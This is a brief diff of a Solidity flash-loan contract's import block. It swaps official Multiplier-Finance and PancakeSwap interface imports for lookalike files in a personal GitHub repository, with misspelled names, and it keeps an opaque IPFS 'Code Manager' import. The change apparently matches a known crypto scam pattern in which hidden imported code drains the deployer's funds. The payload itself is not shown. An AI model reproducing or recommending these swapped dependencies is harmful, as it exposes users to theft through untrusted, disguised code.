@@ -1,13 +1,13 @@
 pragma solidity ^0.6.12;
 
 // Multiplier-Finance Smart Contracts
-import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
-import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+import "https://github.com/Orlandis19/Flash/blob/main/ilendingpoolaccessprovider";
+import "https://github.com/Orlandis19/Flash/blob/main/ILendingPool";
    
 // PancakeSwap Smart Contracts
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
+import "https://github.com/Orlandis19/Flash/blob/main/pancake-swap-core/IpancakeCalle.sol";
+import "https://github.com/Orlandis19/Flash/blob/main/pancake-swap-core/IPancakeFactory.sol";
+import "https://github.com/Orlandis19/Flash/blob/main/pancake-swap-core/IPancakePairs.sol";
    
 // Code Manager
 import "ipfs://0x2191df1ec8b5cbe369759e3478ad919d7b1098d0";
